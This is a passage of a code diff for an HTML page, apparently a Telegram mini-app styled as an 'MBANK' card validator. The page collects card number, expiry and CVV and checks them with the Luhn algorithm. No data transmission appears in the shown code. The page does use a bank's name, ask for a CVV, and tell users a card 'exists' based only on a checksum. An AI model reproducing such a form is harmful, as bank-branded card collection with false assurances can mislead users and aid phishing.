@@ -1,238 +1,694 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MBANK Pro Валидатор</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        :root {
-            --mbank-green: #24c851;
-            --mbank-dark-green: #1ca340;
-            --error-red: #ff3b30;
-            --gray-bg: #f5f5f7;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background-color: var(--tg-theme-bg-color, var(--gray-bg));
-            color: var(--tg-theme-text-color, #000000);
-            margin: 0; padding: 16px;
-            display: flex; justify-content: center;
-        }
-        .app-container {
-            background: var(--tg-theme-secondary-bg-color, #ffffff);
-            padding: 24px; border-radius: 20px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.04);
-            width: 100%; max-width: 360px; box-sizing: border-box;
-        }
-        .header { text-align: center; margin-bottom: 24px; }
-        .header h2 { margin: 0 0 8px 0; font-size: 22px; color: var(--mbank-green); }
-        .header p { margin: 0; font-size: 13px; color: var(--tg-theme-hint-color, #8e8e93); }
-        .input-group { margin-bottom: 18px; position: relative; }
-        label { display: block; margin-bottom: 8px; font-size: 11px; font-weight: 600; text-transform: uppercase; color: var(--tg-theme-hint-color, #8e8e93); }
-        input {
-            width: 100%; padding: 14px;
-            border: 1px solid rgba(0, 0, 0, 0.1); border-radius: 12px;
-            font-size: 16px; font-weight: 500;
-            background: var(--tg-theme-bg-color, #fafafa);
-            color: var(--tg-theme-text-color, #000000);
-            box-sizing: border-box; outline: none; transition: all 0.2s ease;
-        }
-        input.valid { border-color: var(--mbank-green); box-shadow: 0 0 0 3px rgba(36, 200, 81, 0.15); }
-        input.invalid { border-color: var(--error-red); box-shadow: 0 0 0 3px rgba(255, 59, 48, 0.15); }
-        .card-row { display: flex; gap: 16px; }
-        .flex-1 { flex: 1; }
-        .btn-submit {
-            width: 100%; padding: 16px;
-            background: linear-gradient(135deg, var(--mbank-green), var(--mbank-dark-green));
-            color: white; border: none; border-radius: 14px;
-            font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 12px;
-            box-shadow: 0 4px 12px rgba(36, 200, 81, 0.2); transition: all 0.2s ease;
-        }
-        .btn-submit:disabled { background: #d1d1d6 !important; color: #8e8e93; cursor: not-allowed; box-shadow: none; }
-        .card-type-badge { position: absolute; right: 14px; top: 38px; font-size: 12px; font-weight: bold; }
-        .status-text { font-size: 12px; margin-top: 4px; display: block; }
-        
-        /* Модальное окно */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; z-index: 100; }
-        .modal-content { background: var(--tg-theme-secondary-bg-color, #ffffff); padding: 24px; border-radius: 16px; width: 280px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.15); }
-        .modal-btn { margin-top: 16px; padding: 10px 20px; background: var(--mbank-green); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>MBANK Валидатор</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+  :root {
+    --g: #22c55e;
+    --gd: #16a34a;
+    --gl: rgba(34,197,94,0.12);
+    --r: #ef4444;
+    --rl: rgba(239,68,68,0.1);
+    --blue: #3b82f6;
+    --bluel: rgba(59,130,246,0.12);
+    --bg: #0f1117;
+    --bg2: #161b27;
+    --bg3: #1e2536;
+    --border: rgba(255,255,255,0.07);
+    --border2: rgba(255,255,255,0.12);
+    --text: #f1f5f9;
+    --text2: #94a3b8;
+    --text3: #64748b;
+    --radius: 16px;
+    --radius-sm: 10px;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    padding: 20px 16px 40px;
+  }
+
+  .container {
+    width: 100%;
+    max-width: 400px;
+  }
+
+  /* Header */
+  .header {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 28px;
+    padding: 0 2px;
+  }
+  .logo {
+    width: 46px; height: 46px;
+    border-radius: 13px;
+    background: linear-gradient(135deg, #22c55e, #16a34a);
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    box-shadow: 0 0 20px rgba(34,197,94,0.3);
+  }
+  .logo svg { width: 22px; height: 22px; fill: none; stroke: white; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+  .header-text h1 { font-size: 19px; font-weight: 700; letter-spacing: -0.3px; color: var(--text); }
+  .header-text p { font-size: 12px; color: var(--text3); margin-top: 2px; }
+
+  /* Card visual */
+  .card-visual {
+    position: relative;
+    border-radius: 18px;
+    background: linear-gradient(135deg, #1a2744 0%, #0d1b36 100%);
+    border: 1px solid rgba(255,255,255,0.08);
+    padding: 22px 22px 20px;
+    margin-bottom: 24px;
+    overflow: hidden;
+    min-height: 155px;
+  }
+  .card-visual::before {
+    content: '';
+    position: absolute; top: -40px; right: -40px;
+    width: 160px; height: 160px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(34,197,94,0.12) 0%, transparent 70%);
+  }
+  .card-visual::after {
+    content: '';
+    position: absolute; bottom: -30px; left: 40px;
+    width: 120px; height: 120px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(59,130,246,0.07) 0%, transparent 70%);
+  }
+  .card-chip {
+    width: 36px; height: 27px;
+    border-radius: 6px;
+    background: linear-gradient(135deg, #fcd34d, #d97706);
+    margin-bottom: 18px;
+    position: relative;
+    overflow: hidden;
+  }
+  .card-chip::before { content: ''; position: absolute; top: 50%; left: 0; right: 0; height: 1px; background: rgba(0,0,0,0.2); }
+  .card-chip::after { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 1px; background: rgba(0,0,0,0.2); }
+
+  .card-number-display {
+    font-size: 17px;
+    font-family: 'SF Mono', 'Courier New', monospace;
+    letter-spacing: 3px;
+    color: white;
+    margin-bottom: 16px;
+    font-weight: 500;
+  }
+  .card-number-display .dim { color: rgba(255,255,255,0.35); }
+
+  .card-bottom {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-end;
+  }
+  .card-label { font-size: 9px; text-transform: uppercase; letter-spacing: 0.08em; color: rgba(255,255,255,0.4); margin-bottom: 3px; }
+  .card-value { font-size: 13px; font-weight: 600; color: white; letter-spacing: 1px; font-family: 'SF Mono', monospace; }
+  .card-type-logo {
+    font-size: 11px; font-weight: 700; letter-spacing: 0.05em;
+    padding: 4px 10px;
+    border-radius: 6px;
+    transition: all 0.3s;
+  }
+  .type-elcart { background: rgba(34,197,94,0.2); color: #4ade80; border: 1px solid rgba(34,197,94,0.3); }
+  .type-visa { background: rgba(59,130,246,0.2); color: #93c5fd; border: 1px solid rgba(59,130,246,0.3); }
+  .type-unknown { background: rgba(255,255,255,0.06); color: rgba(255,255,255,0.3); border: 1px solid rgba(255,255,255,0.06); }
+
+  /* Form */
+  .form-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 22px;
+    margin-bottom: 12px;
+  }
+
+  .field { margin-bottom: 16px; }
+  .field:last-child { margin-bottom: 0; }
+
+  .field-label {
+    font-size: 11px; font-weight: 600;
+    text-transform: uppercase; letter-spacing: 0.07em;
+    color: var(--text3);
+    margin-bottom: 8px;
+    display: flex; align-items: center; gap: 6px;
+  }
+  .field-label .status-dot {
+    width: 5px; height: 5px; border-radius: 50%;
+    background: var(--text3);
+    transition: background 0.2s;
+    flex-shrink: 0;
+  }
+  .field-label .status-dot.ok { background: var(--g); }
+  .field-label .status-dot.err { background: var(--r); }
+
+  .input-wrap { position: relative; }
+
+  input {
+    width: 100%;
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    border-radius: var(--radius-sm);
+    padding: 13px 16px;
+    font-size: 16px;
+    font-weight: 500;
+    color: var(--text);
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+    -webkit-appearance: none;
+    font-family: 'SF Mono', 'Courier New', monospace;
+    letter-spacing: 1px;
+  }
+  input::placeholder { color: var(--text3); letter-spacing: 0; font-family: -apple-system, sans-serif; font-weight: 400; font-size: 15px; }
+  input:focus { border-color: rgba(255,255,255,0.25); box-shadow: 0 0 0 3px rgba(255,255,255,0.04); }
+  input.v-ok { border-color: rgba(34,197,94,0.5); box-shadow: 0 0 0 3px var(--gl); }
+  input.v-ok:focus { border-color: var(--g); }
+  input.v-err { border-color: rgba(239,68,68,0.5); box-shadow: 0 0 0 3px var(--rl); }
+
+  .input-badge {
+    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+    font-size: 11px; font-weight: 700; letter-spacing: 0.05em;
+    padding: 3px 8px; border-radius: 5px;
+    opacity: 0; transition: opacity 0.2s;
+  }
+  .input-badge.show { opacity: 1; }
+  .input-badge.green { background: rgba(34,197,94,0.15); color: #4ade80; }
+  .input-badge.blue { background: rgba(59,130,246,0.15); color: #93c5fd; }
+  .input-badge.red { background: rgba(239,68,68,0.15); color: #f87171; }
+
+  #cn { padding-right: 90px; }
+
+  .hint {
+    font-size: 11.5px; margin-top: 6px;
+    min-height: 16px;
+    transition: color 0.2s;
+    color: var(--text3);
+  }
+  .hint.ok { color: var(--g); }
+  .hint.err { color: var(--r); }
+
+  .row { display: flex; gap: 12px; }
+  .row .field { flex: 1; }
+
+  /* Divider */
+  .sep { height: 1px; background: var(--border); margin: 0 0 12px; }
+
+  /* Кнопка */
+  .btn {
+    width: 100%;
+    padding: 15px;
+    border-radius: var(--radius-sm);
+    border: none;
+    font-size: 15px; font-weight: 700;
+    letter-spacing: 0.02em;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn:not(:disabled) {
+    background: linear-gradient(135deg, #22c55e, #16a34a);
+    color: white;
+    box-shadow: 0 4px 20px rgba(34,197,94,0.3);
+  }
+  .btn:not(:disabled):hover { box-shadow: 0 6px 28px rgba(34,197,94,0.4); transform: translateY(-1px); }
+  .btn:not(:disabled):active { transform: translateY(0) scale(0.99); box-shadow: 0 2px 10px rgba(34,197,94,0.3); }
+  .btn:disabled {
+    background: var(--bg3);
+    color: var(--text3);
+    cursor: not-allowed;
+    border: 1px solid var(--border);
+  }
+  .btn.success {
+    background: linear-gradient(135deg, #22c55e, #16a34a) !important;
+    box-shadow: 0 4px 20px rgba(34,197,94,0.3) !important;
+  }
+
+  /* Result */
+  .result {
+    background: var(--bg2);
+    border: 1px solid rgba(34,197,94,0.2);
+    border-radius: var(--radius);
+    padding: 20px;
+    margin-top: 12px;
+    display: none;
+    animation: slideUp 0.3s ease;
+  }
+  .result.show { display: block; }
+
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateY(8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .result-title {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 13px; font-weight: 700;
+    color: var(--g);
+    margin-bottom: 14px;
+    text-transform: uppercase; letter-spacing: 0.06em;
+  }
+  .result-title svg { width: 16px; height: 16px; stroke: var(--g); fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
+
+  .result-rows { display: flex; flex-direction: column; gap: 0; }
+  .result-row {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 9px 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 13px;
+  }
+  .result-row:last-child { border-bottom: none; }
+  .result-row .k { color: var(--text3); }
+  .result-row .v { color: var(--text); font-weight: 500; font-family: 'SF Mono', monospace; font-size: 12px; }
+
+  .verdict-box {
+    margin-top: 14px;
+    padding: 12px 14px;
+    border-radius: var(--radius-sm);
+    background: rgba(34,197,94,0.08);
+    border: 1px solid rgba(34,197,94,0.2);
+    display: flex; align-items: center; gap: 10px;
+    font-size: 13px; font-weight: 600; color: #4ade80;
+  }
+  .verdict-box svg { width: 18px; height: 18px; stroke: var(--g); fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0; }
+
+  /* Security badges */
+  .security-row {
+    display: flex; justify-content: center; gap: 16px;
+    margin-top: 18px;
+    padding-top: 14px;
+  }
+  .sec-badge {
+    display: flex; align-items: center; gap: 5px;
+    font-size: 10px; color: var(--text3);
+  }
+  .sec-badge svg { width: 12px; height: 12px; stroke: var(--text3); fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+
+  /* Progress dots */
+  .progress-bar {
+    display: flex; gap: 6px;
+    margin-bottom: 20px;
+  }
+  .progress-dot {
+    flex: 1; height: 3px; border-radius: 2px;
+    background: var(--border2);
+    transition: background 0.3s;
+  }
+  .progress-dot.active { background: var(--g); }
+  .progress-dot.partial { background: rgba(34,197,94,0.35); }
+</style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="header">
-        <h2>MBANK Валидатор 🚀</h2>
-        <p>Автономная проверка карт (ЭЛКАРТ ЗАО «МПЦ» / VISA)</p>
+<div class="container">
+
+  <!-- Header -->
+  <div class="header">
+    <div class="logo">
+      <svg viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/><path d="M6 15h4"/><path d="M14 15h2"/></svg>
     </div>
-    
-    <div class="input-group">
-        <label for="card_number">Номер карты</label>
-        <input type="text" id="card_number" inputmode="numeric" placeholder="9470 ...." maxlength="22">
-        <span id="card_type_text" class="card-type-badge"></span>
-        <span id="validation_status" class="status-text"></span>
+    <div class="header-text">
+      <h1>MBANK Валидатор</h1>
+      <p>ЭЛКАРТ / VISA — офлайн проверка</p>
+    </div>
+  </div>
+
+  <!-- Прогресс -->
+  <div class="progress-bar">
+    <div class="progress-dot" id="p1"></div>
+    <div class="progress-dot" id="p2"></div>
+    <div class="progress-dot" id="p3"></div>
+  </div>
+
+  <!-- Карта-превью -->
+  <div class="card-visual" id="card_visual">
+    <div class="card-chip"></div>
+    <div class="card-number-display" id="preview_num">
+      <span class="dim">•••• •••• •••• ••••</span>
+    </div>
+    <div class="card-bottom">
+      <div>
+        <div class="card-label">Срок действия</div>
+        <div class="card-value" id="preview_exp">—— / ——</div>
+      </div>
+      <div class="card-type-logo type-unknown" id="preview_type">КАРТА</div>
+    </div>
+  </div>
+
+  <!-- Форма -->
+  <div class="form-card">
+
+    <div class="field">
+      <div class="field-label"><span class="status-dot" id="dot1"></span>Номер карты</div>
+      <div class="input-wrap">
+        <input type="text" id="cn" inputmode="numeric" placeholder="9470 XXXX XXXX XXXX" maxlength="22" autocomplete="cc-number">
+        <span class="input-badge" id="cn_badge"></span>
+      </div>
+      <div class="hint" id="cn_hint"></div>
     </div>
 
-    <div class="card-row">
-        <div class="input-group flex-1">
-            <label for="card_date">Срок действия</label>
-            <input type="text" id="card_date" inputmode="numeric" placeholder="ММ/ГГ" maxlength="5">
+    <div class="sep"></div>
+
+    <div class="row">
+      <div class="field">
+        <div class="field-label"><span class="status-dot" id="dot2"></span>Срок действия</div>
+        <div class="input-wrap">
+          <input type="text" id="cd" inputmode="numeric" placeholder="ММ / ГГ" maxlength="5" autocomplete="cc-exp">
         </div>
-        <div class="input-group flex-1" id="cvv_block">
-            <label for="card_cvv">CVV/CVC</label>
-            <input type="password" id="card_cvv" inputmode="numeric" placeholder="***" maxlength="3">
+        <div class="hint" id="cd_hint"></div>
+      </div>
+      <div class="field" id="cvv_wrap">
+        <div class="field-label"><span class="status-dot" id="dot3"></span>CVV / CVC</div>
+        <div class="input-wrap">
+          <input type="password" id="cv" inputmode="numeric" placeholder="•••" maxlength="3" autocomplete="cc-csc">
         </div>
+        <div class="hint" id="cv_hint"></div>
+      </div>
     </div>
 
-    <button class="btn-submit" id="submit_btn" onclick="showLocalResult()" disabled>Введите данные 🔒</button>
-</div>
+  </div>
 
-<div id="resultModal" class="modal">
-    <div class="modal-content">
-        <h3 style="color: var(--mbank-green); margin-top: 0;">🎉 Проверка успешна!</h3>
-        <p id="modal_text" style="font-size: 14px; line-height: 1.4; text-align: left;"></p>
-        <button class="modal-btn" onclick="closeModal()">Отлично</button>
+  <!-- Кнопка -->
+  <button class="btn" id="btn" disabled>Введите данные карты</button>
+
+  <!-- Результат -->
+  <div class="result" id="result">
+    <div class="result-title">
+      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      Проверка пройдена
     </div>
+    <div class="result-rows">
+      <div class="result-row"><span class="k">Платёжная система</span><span class="v" id="r_sys">—</span></div>
+      <div class="result-row"><span class="k">Процессинг</span><span class="v">ЗАО «МПЦ» · Кыргызстан</span></div>
+      <div class="result-row"><span class="k">Номер карты</span><span class="v" id="r_num">—</span></div>
+      <div class="result-row"><span class="k">Срок действия</span><span class="v" id="r_exp">—</span></div>
+      <div class="result-row"><span class="k">Алг. Луна</span><span class="v" style="color: var(--g)">✓ Пройден</span></div>
+    </div>
+    <div class="verdict-box">
+      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Карта существует — структура верна
+    </div>
+  </div>
+
+  <!-- Безопасность -->
+  <div class="security-row">
+    <div class="sec-badge">
+      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      Офлайн проверка
+    </div>
+    <div class="sec-badge">
+      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Данные не передаются
+    </div>
+    <div class="sec-badge">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      Алг. Луна
+    </div>
+  </div>
+
 </div>
 
 <script>
+  // Telegram WebApp
+  try {
     const tg = window.Telegram.WebApp;
-    tg.expand(); 
     tg.ready();
+    tg.expand();
+    tg.setHeaderColor('#0f1117');
+    tg.setBackgroundColor('#0f1117');
+  } catch(e) {}
 
-    const cardInput = document.getElementById('card_number');
-    const dateInput = document.getElementById('card_date');
-    const cvvBlock = document.getElementById('cvv_block');
-    const cvvInput = document.getElementById('card_cvv');
-    const typeBadge = document.getElementById('card_type_text');
-    const statusText = document.getElementById('validation_status');
-    const submitBtn = document.getElementById('submit_btn');
-    const modal = document.getElementById('resultModal');
-    const modalText = document.getElementById('modal_text');
+  const cnEl = document.getElementById('cn');
+  const cdEl = document.getElementById('cd');
+  const cvEl = document.getElementById('cv');
+  const cnBadge = document.getElementById('cn_badge');
+  const cnHint = document.getElementById('cn_hint');
+  const cdHint = document.getElementById('cd_hint');
+  const cvHint = document.getElementById('cv_hint');
+  const btn = document.getElementById('btn');
+  const cvvWrap = document.getElementById('cvv_wrap');
+  const result = document.getElementById('result');
+  const previewNum = document.getElementById('preview_num');
+  const previewExp = document.getElementById('preview_exp');
+  const previewType = document.getElementById('preview_type');
+  const dot1 = document.getElementById('dot1');
+  const dot2 = document.getElementById('dot2');
+  const dot3 = document.getElementById('dot3');
 
-    let detectedType = "Неизвестно";
-    let isAllowedSystem = false;
+  let cardType = null;
+  let submitted = false;
 
-    // Алгоритм Луна
-    function validateLuhn(cardNumber) {
-        let num = cardNumber.replace(/\s+/g, '');
-        if (!/^\d{16,19}$/.test(num)) return false;
-        let sum = 0;
-        for (let i = 0; i < num.length; i++) {
-            let intVal = parseInt(num.substr(i, 1));
-            if (i % 2 === (num.length % 2 === 0 ? 0 : 1)) {
-                intVal *= 2; if (intVal > 9) intVal -= 9;
-            }
-            sum += intVal;
-        }
-        return (sum % 10 === 0);
+  function luhn(n) {
+    n = n.replace(/\s/g, '');
+    if (!/^\d{13,19}$/.test(n)) return false;
+    let s = 0;
+    for (let i = 0; i < n.length; i++) {
+      let d = +n[i];
+      if (i % 2 === (n.length % 2 === 0 ? 0 : 1)) { d *= 2; if (d > 9) d -= 9; }
+      s += d;
     }
+    return s % 10 === 0;
+  }
 
-    function checkFormValidity() {
-        let rawCard = cardInput.value.replace(/\s+/g, '');
-        let isLuhnValid = validateLuhn(rawCard);
-        let isDateValid = /^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(dateInput.value);
-        let isCvvValid = rawCard.startsWith('9470') || rawCard.startsWith('9471') ? true : /^\d{3}$/.test(cvvInput.value);
+  function expValid(v) {
+    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(v)) return false;
+    const [m, y] = v.split('/').map(Number);
+    const now = new Date();
+    return new Date(2000 + y, m, 0) >= now;
+  }
 
-        if (isAllowedSystem && isLuhnValid && isDateValid && isCvvValid) {
-            submitBtn.disabled = false;
-            submitBtn.innerText = "Проверить карту 🚀";
-        } else {
-            submitBtn.disabled = true;
-            submitBtn.innerText = "Карта невалидна 🔒";
-        }
-    }
+  function updateProgress() {
+    const raw = cnEl.value.replace(/\s/g, '');
+    const isElk = raw.startsWith('9470') || raw.startsWith('9471');
+    const lOk = luhn(raw) && raw.length >= 16;
+    const eOk = expValid(cdEl.value);
+    const cOk = isElk ? true : /^\d{3}$/.test(cvEl.value);
 
-    cardInput.addEventListener('input', (e) => {
-        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-
-        // 1. ИДЕНТИФИКАЦИЯ СИСТЕМЫ ПО ВАШИМ ДАННЫМ ЗАО «МПЦ»
-        if (value.startsWith('9470') || value.startsWith('9471')) {
-            detectedType = 'ЭЛКАРТ 🇰🇬'; 
-            isAllowedSystem = true;
-            statusText.innerText = '';
-            cvvBlock.style.display = 'none'; // Элкарт МПЦ не требует CVV
-            cvvInput.value = '';
-        } 
-        else if (value.startsWith('4')) {
-            detectedType = 'VISA 💳'; 
-            isAllowedSystem = true;
-            statusText.innerText = '';
-            cvvBlock.style.display = 'block'; // Показываем CVV для Visa
-        } 
-        else {
-            // Жестко отсекаем 2222, 5555 и любые другие некорректные БИНы
-            detectedType = 'Не поддерживается ❌'; 
-            isAllowedSystem = false;
-            statusText.innerText = '🔴 Карты этой системы не поддерживаются!'; 
-            statusText.style.color = 'var(--error-red)';
-            cvvBlock.style.display = 'block';
-        }
-
-        if (value.length > 0) {
-            typeBadge.innerText = detectedType; 
-            typeBadge.style.color = isAllowedSystem ? (value.startsWith('9') ? '#24c851' : '#004194') : 'var(--error-red)';
-        } else {
-            typeBadge.innerText = '';
-            statusText.innerText = '';
-        }
-
-        // 2. Валидация Луна
-        if (isAllowedSystem && value.length >= 16) {
-            if (validateLuhn(value)) {
-                cardInput.className = 'valid';
-                statusText.innerText = '🟢 Структура карты верна!'; 
-                statusText.style.color = 'var(--mbank-green)';
-            } else {
-                cardInput.className = 'invalid';
-                statusText.innerText = '🔴 Ошибка: Несуществующий номер (Луна)'; 
-                statusText.style.color = 'var(--error-red)';
-            }
-        } else if (!isAllowedSystem && value.length > 0) {
-            cardInput.className = 'invalid';
-        } else {
-            cardInput.className = '';
-        }
-
-        let matches = value.match(/\d{1,4}/g);
-        e.target.value = matches ? matches.join(' ') : value;
-        checkFormValidity();
+    ['p1','p2','p3'].forEach(id => {
+      document.getElementById(id).className = 'progress-dot';
     });
+    if (lOk) document.getElementById('p1').className = 'progress-dot active';
+    else if (raw.length > 0) document.getElementById('p1').className = 'progress-dot partial';
+    if (eOk) document.getElementById('p2').className = 'progress-dot active';
+    else if (cdEl.value.length > 0) document.getElementById('p2').className = 'progress-dot partial';
+    if (cOk && (isElk || cvEl.value.length > 0)) document.getElementById('p3').className = 'progress-dot active';
+    else if (cvEl.value.length > 0) document.getElementById('p3').className = 'progress-dot partial';
+  }
 
-    dateInput.addEventListener('input', (e) => {
-        let value = e.target.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
-        if (value.length > 2) e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
-        
-        if (e.target.value.length === 5) {
-            if (/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(e.target.value)) dateInput.className = 'valid';
-            else dateInput.className = 'invalid';
-        } else { dateInput.className = ''; }
-        checkFormValidity();
-    });
-
-    cvvInput.addEventListener('input', () => {
-        if (cvvInput.value.length === 3) cvvInput.className = 'valid';
-        else cvvInput.className = '';
-        checkFormValidity();
-    });
-
-    function showLocalResult() {
-        let rawCard = cardInput.value;
-        modalText.innerHTML = `
-            🌐 Система: <b>${detectedType}</b><br>
-            🏦 Процессинг: <b>ЗАО «МПЦ» (Кыргызстан)</b><br>
-            🔢 Номер: <code>${rawCard.substring(0, 9)}...</code><br>
-            📅 Срок действия: <b>${dateInput.value}</b><br><br>
-            🟢 <b>ВЕРДИКТ: КАРТА СУЩЕСТВУЕТ!</b>
-        `;
-        modal.style.display = 'flex';
+  function updatePreview() {
+    const raw = cnEl.value.replace(/\s/g, '');
+    if (raw.length === 0) {
+      previewNum.innerHTML = '<span class="dim">•••• •••• •••• ••••</span>';
+    } else {
+      const padded = raw.padEnd(16, '•');
+      const groups = [];
+      for (let i = 0; i < 16; i += 4) groups.push(padded.slice(i, i+4));
+      previewNum.innerHTML = groups.map((g, gi) => {
+        const chars = [];
+        for (let j = 0; j < g.length; j++) {
+          const realIdx = gi * 4 + j;
+          chars.push(realIdx < raw.length ? g[j] : '<span class="dim">•</span>');
+        }
+        return chars.join('');
+      }).join(' ');
     }
 
-    function closeModal() {
-        modal.style.display = 'none';
-        tg.close();
+    const expVal = cdEl.value || '';
+    previewExp.textContent = expVal.length > 0 ? expVal : '—— / ——';
+  }
+
+  function check() {
+    const raw = cnEl.value.replace(/\s/g, '');
+    const isElk = raw.startsWith('9470') || raw.startsWith('9471');
+    const lOk = luhn(raw) && raw.length >= 16;
+    const eOk = expValid(cdEl.value);
+    const cOk = isElk ? true : /^\d{3}$/.test(cvEl.value);
+    const allowed = cardType !== null;
+
+    updateProgress();
+
+    const all = allowed && lOk && eOk && cOk;
+    btn.disabled = !all || submitted;
+
+    if (submitted) return;
+
+    if (raw.length === 0) {
+      btn.textContent = 'Введите данные карты';
+    } else if (!allowed) {
+      btn.textContent = 'Система не поддерживается';
+    } else if (!lOk && raw.length >= 16) {
+      btn.textContent = 'Номер не прошёл проверку Луна';
+    } else if (!eOk && cdEl.value.length === 5) {
+      btn.textContent = 'Срок действия истёк';
+    } else if (!cOk && cvEl.value.length === 3) {
+      btn.textContent = 'CVV должен содержать 3 цифры';
+    } else if (all) {
+      btn.textContent = 'Проверить карту →';
+    } else {
+      btn.textContent = 'Заполните все поля';
     }
+  }
+
+  cnEl.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '');
+    const isElk = v.startsWith('9470') || v.startsWith('9471');
+    const isVisa = v.startsWith('4');
+
+    if (isElk) {
+      cardType = 'elcart';
+      cvvWrap.style.display = 'none';
+      cvEl.value = '';
+      dot3.className = 'status-dot ok';
+    } else if (isVisa) {
+      cardType = 'visa';
+      cvvWrap.style.display = 'block';
+    } else {
+      cardType = null;
+      cvvWrap.style.display = 'block';
+    }
+
+    // Форматирование
+    const m = v.match(/\d{1,4}/g);
+    e.target.value = m ? m.join(' ') : '';
+
+    // Превью типа
+    if (!cardType && v.length === 0) {
+      previewType.textContent = 'КАРТА';
+      previewType.className = 'card-type-logo type-unknown';
+      cnBadge.className = 'input-badge';
+      cnEl.className = '';
+      cnHint.textContent = ''; cnHint.className = 'hint';
+      dot1.className = 'status-dot';
+    } else if (!cardType) {
+      previewType.textContent = 'НЕ ПОДДЕРЖ.';
+      previewType.className = 'card-type-logo type-unknown';
+      cnBadge.textContent = 'Не поддерж.';
+      cnBadge.className = 'input-badge red show';
+      cnEl.className = 'v-err';
+      cnHint.textContent = 'Поддерживаются только ЭЛКАРТ (9470/9471) и VISA (4...)';
+      cnHint.className = 'hint err';
+      dot1.className = 'status-dot err';
+    } else if (isElk) {
+      previewType.textContent = 'ЭЛКАРТ';
+      previewType.className = 'card-type-logo type-elcart';
+      cnBadge.textContent = 'ЭЛКАРТ';
+      cnBadge.className = 'input-badge green show';
+    } else {
+      previewType.textContent = 'VISA';
+      previewType.className = 'card-type-logo type-visa';
+      cnBadge.textContent = 'VISA';
+      cnBadge.className = 'input-badge blue show';
+    }
+
+    if (cardType && v.length >= 16) {
+      if (luhn(v)) {
+        cnEl.className = 'v-ok';
+        cnHint.textContent = 'Контрольная сумма верна (алг. Луна)';
+        cnHint.className = 'hint ok';
+        dot1.className = 'status-dot ok';
+      } else {
+        cnEl.className = 'v-err';
+        cnHint.textContent = 'Ошибка контрольной суммы — номер не существует';
+        cnHint.className = 'hint err';
+        dot1.className = 'status-dot err';
+      }
+    } else if (cardType && v.length > 0) {
+      cnEl.className = '';
+      cnHint.textContent = `Введено ${v.length} / 16 цифр`;
+      cnHint.className = 'hint';
+      dot1.className = 'status-dot';
+    }
+
+    updatePreview();
+    result.classList.remove('show');
+    submitted = false;
+    check();
+  });
+
+  cdEl.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '');
+    if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
+    e.target.value = v;
+
+    if (v.length === 5) {
+      if (expValid(v)) {
+        cdEl.className = 'v-ok';
+        cdHint.textContent = 'Карта действительна';
+        cdHint.className = 'hint ok';
+        dot2.className = 'status-dot ok';
+      } else {
+        cdEl.className = 'v-err';
+        cdHint.textContent = 'Срок действия истёк';
+        cdHint.className = 'hint err';
+        dot2.className = 'status-dot err';
+      }
+    } else {
+      cdEl.className = '';
+      cdHint.textContent = '';
+      dot2.className = 'status-dot';
+    }
+
+    updatePreview();
+    result.classList.remove('show');
